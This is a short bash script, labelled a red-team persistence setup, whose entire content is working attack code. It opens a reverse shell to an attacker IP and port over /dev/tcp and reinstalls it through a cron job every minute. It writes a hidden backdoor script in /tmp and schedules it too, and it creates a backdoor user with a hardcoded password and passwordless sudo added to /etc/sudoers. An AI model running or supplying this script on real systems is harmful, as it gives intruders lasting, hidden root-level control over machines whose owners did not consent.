#!/bin/bash

# Red Team - Full Persistence Setup

ATTACKER_IP="192.168.1.100"
PORT="5555"
REVERSE_SHELL_CMD="/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"

# Step 1: Set up reverse shell persistence via cron
echo "[+] Setting up reverse shell persistence..."
(crontab -l 2>/dev/null; echo "* * * * * $REVERSE_SHELL_CMD") | crontab -

# Step 2: Drop a backdoor script in /tmp and schedule cron job for it
BACKDOOR_SCRIPT="/tmp/.backdoor.sh"
echo "[+] Creating backdoor script in /tmp..."
cat <<EOF > $BACKDOOR_SCRIPT
#!/bin/bash
$REVERSE_SHELL_CMD
EOF

chmod +x $BACKDOOR_SCRIPT
(crontab -l 2>/dev/null; echo "* * * * * /tmp/.backdoor.sh") | crontab -

# Step 3: Create a SSH backdoor user
USERNAME="backdoor"
PASSWORD="backdoorpass"
echo "[+] Creating SSH backdoor user..."
useradd -m -p $(openssl passwd -1 $PASSWORD) -s /bin/bash $USERNAME
echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

echo "[+] Full persistence setup complete."